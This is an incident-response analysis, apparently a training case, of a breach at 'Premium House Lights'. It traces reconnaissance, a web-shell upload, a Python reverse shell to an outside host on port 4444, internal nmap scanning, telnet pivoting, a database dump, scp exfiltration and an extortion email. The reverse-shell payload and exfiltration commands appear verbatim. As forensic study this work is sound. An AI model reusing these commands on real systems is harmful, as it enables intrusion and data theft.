[link](https://docs.google.com/open?id=1zHGOtjHUVLXJbR0f9h2ptVqsdJMjhLS8buEhFG1jNUQ)

Technical Analysis

PREMIUM HOUSE LIGHTS













Threat profiles

### Attacker

| Name  | Service | IP | AS |
|----------|----------|----------|----------|
| Attacker | C2 Server on 4444/tcp | 138.68.92.163
 | AS14061Digital Ocean |
| Attacker | Exfiltration host | 178.62.228.28 | AS14061
Digital Ocean |


### Sitechecker.com

| Webcrawler | IP | AS | Crawled path  |
|----------|----------|----------|----------|
| sitechecker.pro | 136.243.111.17
 | AS24940Hetzner Online | / HTTP/1.1 |
| sitechecker.pro | 138.201.202.232 | AS24940
Hetzner Online | / HTTP/1.1/?_escaped_fragment_ |


## 

## 

## Methodology for Analysis of Case Files

The Next section will contain steps taken through the analysis case file.Below is an example cell.

| Example cell |
|----------|
| Title/brief summary |
| Screenshots/Evidences/Image |
| Legend:  |
| Each cell contains:
Cell Reference (1.0 to 7.0)
Files used
Information Description: Steps to replicate information, information analysis
Information: Code, Data, File or Image, etc

Other cells may have a Failed Control section. Highlighted in       :
Control Type and Reason of control failure included |








## 

## 

## 

## 

















## Technical Analysis - Case Files

### Preliminary steps



| Preliminary: Unzipped artifacts have the correct identifying hash value. |
|----------|
| 

 |
| Match Hashes from unzipped artifacts with shaw256sum.txt file |
| Steps: 1. In Windows>Start cmd>Input: cat C:\Users\path\to\your\sha256sum
           2.(For each artifact)Input: certutil -hashfile  C:\Users\path\to\your\artifact        SHA256
           3.Check each SHA256 hash>Make a script if required |
| Used ChatGPT 4o mini 
Script for Windows Powershell:Get-ChildItem 'C:\Users\frede\YOUR\PATH\TO\Evidence' | ForEach-Object {
	$hash = Get-FileHash $_.FullName -Algorithm SHA256
	[PSCustomObject]@{ FileName = $_.Name; SHA256 = $hash.Hash }
} |






| Preliminary: Case Artifacts: Files in the unzipped folder AND the initial threat email |
|----------|
|  |
| phl_database, 1/08/2025  10:10 AM, Wireshark capture file, 292 KB
phl_database_access_log, 11:02 AM  6:33 PM, Text Document, 7 KB
phl_database_shell, 1/08/2025  10:10 AM, Text Document, 1 KB
phl_database_tables, 1/08/2025  10:10 AM, Data Base File,18 KB
phl_network_diagram, 1/08/2025  10:10 AM, PNG File, 112 KB
phl_webserver, 1/08/2025 10:05 AM, Wireshark capture file, 805 KB
sha256sum, 1/08/2025  10:02 AM, Text Document, 1 KB
phl_access_log, 1/08/2025  11:17 AM, Text Document, 27 KB
phl_access_log(l), 1/09/2025  7:28 AM, Text Document, 27 KB
initial threat email, 1/09/2025  7:35 AM, Text Document, 2 KB |
| Included Initial threat email |




### 

### Dive into Case Files



| 1.0 |
|----------|
|  Reconnaissance Activity and Exploitation:  |
| 
138.68.92.163 - - [19/Feb/2022:21:58:40 -0500] "GET /upload.php HTTP/1.1" 200 487 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
138.68.92.163 - - [19/Feb/2022:21:58:40 -0500] "GET /uploads/ HTTP/1.1" 200 1115 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
138.68.92.163 - - [19/Feb/2022:21:58:55 -0500] "GET /uploads/ HTTP/1.1" 200 1115 "-" "curl/7.68.0"
138.68.92.163 - - [19/Feb/2022:21:59:04 -0500] "POST /uploads/shell.php HTTP/1.1" 200 2655 "-" "curl/7.68.0"
 |
| File used:Phl_access_log file Steps taken: On windows, ctrl+f and searched ?200? ( 4 lines with a 200 OK status code from 138.68.92.163 and accesses web server /uploads/)

Details:
Reconnaissance Activity: At 02:58:12, the attacker from IP 138.68.92.163 performed a port scan to identify open services on the server (e.g., HTTP and HTTPS ports).
At 02:58:22, the attacker started automated testing of various website paths (e.g., /index, /register, /forum) using GET requests to look for weaknesses.
Exploitation:The attacker accessed the /uploads/ directory and executed a POST request to upload a malicious file (shell.php) at 02:59:04.This file likely provided unauthorized control of the server, putting data and systems at risk.
Findings:
Automated Attack:The attacker used a script or bot to quickly scan ports and test multiple website paths(Tools like curl were used to exploit the vulnerability)
Vulnerability in File Upload:The /upload.php endpoint allowed the attacker to upload a malicious file without proper security checks.The /uploads/ directory was left open, enabling the attacker to execute the uploaded file.
Potential Risks:Server compromise through unauthorized remote access.Potential data breaches, disruptions, or lateral movement to other systems |








| 1.1 |
|----------|
| Potentially malicious use of commercial web crawlers. |
| 136.243.111.17 - - [19/Feb/2022:21:56:11 -0500] "GET / HTTP/1.1" 200 491 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"?
138.201.202.232 - - [19/Feb/2022:21:56:13 -0500] "GET /?_escaped_fragment_= HTTP/1.1" 200 491 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
138.201.202.232 - - [19/Feb/2022:21:56:13 -0500] "GET / HTTP/1.1" 200 491 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"?.138.201.202.232 - - [19/Feb/2022:21:57:40 -0500] "GET / HTTP/1.1" 200 491 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
138.68.92.163 - - [19/Feb/2022:21:58:22 -0500] "GET /randomfile1 HTTP/1.1" 404 437 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" |
| File used: phl_access_log


Details: 
IPs 136.243.111.17 and 138.201.202.232 originating from SiteCheckerBotCrawler were identified as the source. 
Log Evidence: Multiple rapid GET requests.
Impact:The crawler activity likely gathered information on the site's structure and identified exploitable endpoints.Supported subsequent malicious activity by IP 138.68.92.163 (file upload)

Access Mechanism: The crawler accessed outdated endpoints (?_escaped_fragment_) and tested non-existent paths directly.These paths are often indicative of legacy web application vulnerabilities.Crawling for ?_escaped_fragment_ is viable for dynamic content, but overall the industry has moved away from it and is part of the old AJAX crawling scheme.
Automation Evidence:Requests were made in rapid succession, suggesting the use of automated tools.

Weaknesses That Allowed the Incident: 
Restrictions:Lack of robots.txt guidance left the site fully open to crawlers. 
Outdated Endpoints Available:The presence of endpoints like /?_escaped_fragment_ exposed potential vulnerabilities in older frameworks.
Lack of Crawling Detection:No rate-limiting or monitoring tools were in place to identify and block malicious crawler

 |










| 2.0 |
|----------|
| IP 138.68.92.163 uses consumer cloud services for reconnaissance and delivery of exploits - Digital Ocean(commonly use by attackers due to ease of setup and anonymity) |
|  |
| Behavior:
95% bot traffic (Cloudflare Radar) suggests automated activity.
No malicious flagging on VirusTotal, but activity aligns with automation. |
|  |
| radar.cloudflare AS for IP 138.68.92.163https://radar.cloudflare.com/traffic/as14061

Bot Traffic (95%): Indicative of automated tools probing for vulnerabilities, supported by rapid GET and POST requests seen in the logs.
Not Blacklisted: Lack of reputation flags doesn?t guarantee safety?likely part of a new or undetected attack campaign. |
















| 2.1 |
|----------|
| IP 138.68.92.163 begins port scanning at 2022-02-20 02:58:12:322138 |
|  |
| File used: phl_webserver.pcap

Steps taken: In wireshark> Use display filter: ip.src ==138.68.92.163
Details: 
First contact is seen from 138.68.92.163 |
| File used: tcp statistics for 134.22.33.221 |
| Steps taken: Using the current display>Statistics>Endpoints>TCP>Copy as CSVThe file contains statistics for the displayed informationPort scanning initiated by IP 138.68.92.163 on target server 134.122.33.221.Ports: Scanned ports included 80 (HTTP), 443 (HTTPS), and 5900 (VNC)
Significance: attacker probing for open ports to identify exploitable services |














| 2.2 |
|----------|
| IP 138.68.92.163 begins GET path enumeration on port 80 at 2022-02-20 02:58:22.249777 |
|  |
| File used : phl_webserver.pcap

Steps taken: In Wireshark> Display filter: ip.src ==138.68.92.163 and tcp.port == 80 and http.request.method == "GET"

Significance: Attacker identifying accessible directories to exploit vulnerabilities. |
















































| 3.0 |
|----------|
| IP 138.68.92.163  uses POST to push python code at 2022-02-20 02:59:04.17195 |
|  |
| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("138.68.92.163",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Grants the attacker unrestricted command-line access to the webserver |
| File used: phl_webserver.pcap
 
Steps taken: In Wireshark>Display filterip.addr == 138.68.92.163 and http.request.method == "POST"


Details: 
HTTP POST request uploaded a malicious script shell.php to /uploads/
Payload executed a reverse shell for remote server control.

Significance: First evidence of active exploitation. |






| 3.1 |
|----------|
| Delivery from the attacker's viewpoint, gathering the vulnerable web server url |
|  |
| File: phl_webserver.pcap

Steps taken: 1. In Wireshark>Display filter: ip.addr == 138.68.92.163 and              http.response.code == 200                     2. For each file: File>Export Object>HTTP>Search for: upload>Save each |
| 
 |
| Steps taken: Same as above>Search for: shell>Save each

Details: 
Uploaded file shell.php was accessed by the attacker.
Verified using HTTP object export in Wireshark.

Significance: Established remote access for further exploitation. |






| 3.2 |
|----------|
| Attacker uses a vulnerable upload interface to deliver and execute malicious script |
| File used: phl_webserver.pcap

Steps taken: 1. In wireshark>File>Export Object>HTML
                     2. Text filter: upload(based on 1.0 where the attacker makes GET requests to /upload/)
                     3.Text filter: shell( based on 1.0 where the attacker makes a POST request to /upload shell.php/)
                     4.Save the files  webpages as html
 |
| 

Last posted shell.php
It is the interface that the attacker used to execute the delivered remote shell. |
|  |
|  |
| Web Server Vulnerability

Details:
The server was running Apache HTTP Server 2.4.41 134.122.33.221 Port 80, which was outdated and lacked critical security patches as of 2022.This failure to update and secure the web server created an exploitable surface for the attack.

Evidence:
Analysis of HTML source code and HTTP headers revealed server details.?138.68.92.163 - - [20/Feb/2022:02:58:12] "TCP 80, 443, 5900"

Impact: 
Exacerbated the risk of exploitation by exposing outdated services.
The attack involved exploiting a vulnerable file upload mechanism to deliver and execute a reverse shell, granting the attacker unauthorized remote access to the target system.  |






































| 4.0 |
|----------|
| Another method to view malware delivered but does not yield uploaded files compared to 3.2 method above |
|  |
| In WiresharkPhl_webserver.pcap

Steps taken: 1. In Wireshark>File>Export Object>HTTP                     2. Inspect contents(Content type: application/x-www-form-urlencoded)>                     Save as shell.php |
| 
cmd=python+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22138.68.92.163%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3B+os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27 |
| Go TO
URL Decoder/encoder.ioPASTE the URL encoded shell.php

 |
| When we open shell.php, we find it as URL encoded
Use URL Decoder to analyze encoded malicious script>PASTE the URL encoded shell.php
The malicious payload, when decoded, revealed a Python script designed to establish a reverse shell |
| Malicious decoded payload:

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("138.68.92.163",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

Establishes a connection to the attacker?s IP 138.68.92.163 on port 4444.Redirects the input, output, and error streams to the attacker's system.Executes a shell, granting the attacker complete control over the server. |
















| 4.1 |
|----------|
|  The attack involves the deployment of a reverse shell through a vulnerable web server endpoint. The attacker used a malicious Python script to establish a remote connection to their machine |
|  |
| Code breakdown:

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("138.68.92.163",4444));

Use socket library  to establish connection to 138.68.92.163 on port 4444 

os.dup2(s.fileno(),0);

Standard I/O streams (stdin, stdout, stderr) were redirected to the attacker?s socket to enable full interactive control over the compromised system
p=subprocess.call(["/bin/sh","-i"]);

Execution of the reverse shell script allowed the attacker to access the victim server using the shell /bin/sh as the default user

 The shell session is initiated as the current user, but it is remotely accessible, a setup commonly referred to as a "reverse shell" |








| 5.0 |
|----------|
| Remote Code Execution (RCE) through a malicious PHP file uploaded via an unprotected interface begins at 2022-02-20 02:59:04.191040 |
|  |
| From 4.1, we follow the malicious python code calling to 138.68.92.163:4444/tcp
In WiresharkFile used:phl_webserver.pcap

Steps taken: 1. In Wireshark>Display filter: ip.dst 138.68.92.163 and tcp.port 4444
                     2.Apply the display filter that matches the reverse shell IP and port. |






| 5.1 |
|----------|
| Record of the attacker's shell activity(Section 4.1 for reference) |
| 
 Router's public IP
134.122.33.221
 Attacker IP
138.68.92.163
The attack originates from the web server with IP 10.10.1.2 on VLAN 1, where the attacker has gained shell control.  |
| The following security controls failed during this incident:

Details:

Public-Facing Service Network Separation: The attacker successfully obtained shell control of 10.10.1.2 (VLAN 1), compromising the web server

Access Control:The attacker has inherited the user rights of the compromised system.

Network Segregation - VLAN Separation: The attacker could potentially move laterally within VLAN 1 due to possible cross-VLAN misconfigurations.

Network Segregation - Separation of Duties:The attacker now has access to other devices within the same VLAN, which host separate services, increasing the risk of further compromise.

Network Segregation - IP Subnet Separation:The attacker could laterally move to other devices within the same IP subnet, expanding the scope of the breach.
 |




| 6.0 |
|----------|
| Attacker?s commands and the data they retrieved during the attack |
| 
 |
| phl_webserver.pcap
Steps taken: 1.In Wireshark>Display filter:  ip.dst == 138.68.92.163 and tcp.port == 4444                     2.Right click, Follow>TCP Stream>Save as: tcp.stream eq 142
Observations from the Stream
Command inputs originate from 134.122.33.221.
Based on Section 4.1, the attacker's code redirects shell input/output/error to 138.68.92.163:4444.
This TCP stream provides a detailed view of the attacker's reverse shell session, including their commands and interactions with the compromised system. |






| 6.1 |
|----------|
| Get the record of attacker's reverse shell |
| Files used:
Phl_webserver.pcap
tcp stream eq 142


Steps taken: In Wireshark>Display filer: tcp.stream eq 142>Save as: tcp.stream eq 142 |






| 6.2  |
|----------|
| Analysis of the attacker's activities recorded in the TCP stream (tcp stream eq 142) and highlights failed security controls that contributed to the compromise  |
| A.Identifying User Permissions

The attacker executed the command whoami to identify the compromised user account.
Output: www-data
Revealed the attacker had access to a web server account

Failed Control/s:
Lack of proper access controls allowed the attacker to verify the compromised account
 |
| B.Gaining Enhanced Shell Access

Executed Python code to spawn a Bash shell:python -c 'import pty; pty.spawn("/bin/bash")'

 The attacker gained an interactive shell as www-data

Failed Control/s:
Permissions allowed the execution of Python commands.
Python, potentially unnecessary for the web server, was available and exploited.
 |
| C.File and Directory Enumeration
 Executed ls -l to list files and view their permissions
Output: Revealed files, including shell.php

Failed Controls:
Directory permissions exposed sensitive files to the attacker.
 |
| D.Discovering Installed Utilities
Used dpkg -l | grep nmap to check for installed tools.

Identified nmap as installed and accessible.

Failed Controls:
The attacker could access and execute nmap.
Retaining nmap created a "living off the land" vulnerability. |
| E. Network Information Collection
Executed ifconfig to gather network configuration details.

Failed Controls:
Permissions allowed access to sensitive network configuration data. |
| F. Scanning the Internal Network
Command Executed: nmap 10.10.1.0/24

The attacker performed a scan, discovering open ports and services on internal devices.
(Telnet and HTTP services on 10.10.1.3)

Failed Controls:
The attacker exploited unrestricted access to nmap.
Retention of nmap created a "living off the land" vulnerability.
Legacy services such as Telnet and HTTP were still in use.
Unencrypted services (Telnet and HTTP) increased exposure to threats.
 |
| G.Lateral Movement to the Database
Command Executed: telnet 10.10.1
The attacker logged into the database server using weak credentials (phl/phl123)

Failed Controls:

Use of Deprecated Services(Telnet, an insecure protocol, was enabled)
Encryption for Data in Transit(Telnet communications were not encrypted)
Weak password policies allowed unauthorized access.
Router settings permitted Telnet traffic within the network.
 |
| H.Accessing the Database
Command Executed:sudo mysql -u root -p

 The attacker logged into the MySQL database using default credentials

Failed Controls:
Default credentials were not updated or secured.
Role-Based Access Control (RBAC) was not implemented.
Lack of comprehensive system hardening measures.
No MFA was enforced for database access.
 |
| Exfiltrating Data
Commands Executed:

Queried data: SELECT * FROM customers LIMIT 5;
Exported data: mysqldump -u root -p phl > phl.db
Transferred data: scp phl.db fierce@178.62.228.28:/tmp/phl.db
Deleted local copy: rm phl.db

The attacker retrieved and transferred sensitive data to an external server.

Failed Controls:
Router ConfigurationAllowed outbound SCP traffic to external IPs.
Data Loss Prevention (DLP):No monitoring or blocking mechanisms were in place to detect/prevent unauthorized data transfers. |
| Exiting the Shell
The attacker terminated the session by executing exit.
Attacker exits the database at 2022-02-20 03:02:38.656489 |






| 6.3 |
|----------|
| Exfiltration methods: Data was copied from the compromised database using SQL commands and securely transferred via scp to a server on Digital Ocean |
| 


https://radar.cloudflare.com/traffic/as14061
Cloudflare traffic logs indicate high bot activity (95%) targeting Digital Ocean?s infrastructure.

The attack utilized Digital Ocean?s cloud services for data exfiltration(Cloudflare Radar and ASN mappings), using a spoofed domain and foreign-hosted infrastructure to obscure the attackers' identity
Impact: Data Leakage/Reputational Damage/Regulatory Compliance Risks |


 



| 7.0  |
|----------|
| Incident narrative corroboration  |
|  |
| File used: phl_database

Steps taken: In Wireshark>Display filter: ip.src == 10.10.1.2 and ip.dst == 10.10.1.3
beginning of internal nmap TCP scanning by web serverInternal scan starts at 2022-02-20 02:59:45.028702 |
|  |
| File used: phl_database

Steps taken: In Wireshark>Display filter: arpbeginning of internal nmap ARP scanning by web server |
|  |
| File: phl_database

Steps taken:1.In Wireshark>ip.src == 10.10.1.2 and ip.dst == 10.10.1.3 and telnet
                       Analyze>Follow>TCP Steam                    2. select parts of the text tcp stream, and associated packet.log happens when Telnet replies with access to the database at 2022-02-20 03:00:18.756402 |
|  |
| Database data was exfiltrated at 2022-02-20 03:02:17.506011 |






 



## Extortion Email



| Extortion email |
|----------|
| Read the following extortion email sent to the support mailbox:
From: 4C484C@qq.com
To: support@premiumhouselights.com

Hello,

We will go right to the point. We are in possession of your database files, which include sensitive information about your customers.

You wouldn't want this information to be out on the internet, would you? We will release this information on https://pastebin.com if you don't deposit 10 BTC to the following wallet ID: 

               1JQqFLmAp5DQJbdD3ThgEiJGSmX8eaaBid 

by Monday at 10:00AM UTC.  

To demonstrate to you that we aren't just playing games, here is a snippet of your customer database table:

+------------------+-----------------+--------------+
| contactFirstName | contactLastName | phone        |
+------------------+-----------------+--------------+
| Carine           | Schmitt         | 40.32.2555   |
| Jean             | King            | 7025551838   |
| Peter            | Ferguson        | 03 9520 4555 |
| Janine           | Labrune         | 40.67.8555   |
| Jonas            | Bergulfsen      | 07-98 9555   |
+------------------+-----------------+--------------+

Now the ball is in your court to make the right decision and take action. There will be no negotiations on the price.

// The 4C484C Group |




### 

Key Points:

Sender/Attacker group: The email originates from 4C484C@qq.com, a domain associated with the popular Chinese email service mail.qq.com. This address has not been flagged by CleanTalk.org as malicious nor records of then in threat intelligence repositories

Threat: They threaten to release this data publicly on Pastebin unless a ransom of 10 BTC is deposited to the provided wallet (1JQqFLmAp5DQJbdD3ThgEiJGSmX8eaaBid) by a specified deadline (Monday, 10:00 AM UTC).

Evidence Provided:A sample table containing customer information ,matches entries found in phl_database_tables.db, confirming the attacker has access to at least some legitimate company data.

Wallet Details:Bitcoin wallet exists but shows no transaction history(might be a newly generated address for the extortion attempt)

Pastebin Mention: Temporary and anonymous data sharing platform, where they will upload the stolen data if the ransom is not paid. 



Conclusion

The email is a classic extortion attempt, using stolen customer data to coerce the company into paying a ransom. Given the valid sample data provided, the threat is credible. Further investigation into email headers, potential prior compromise paths, and additional threat actor activities is required to fully assess the risk and origin of the attack.

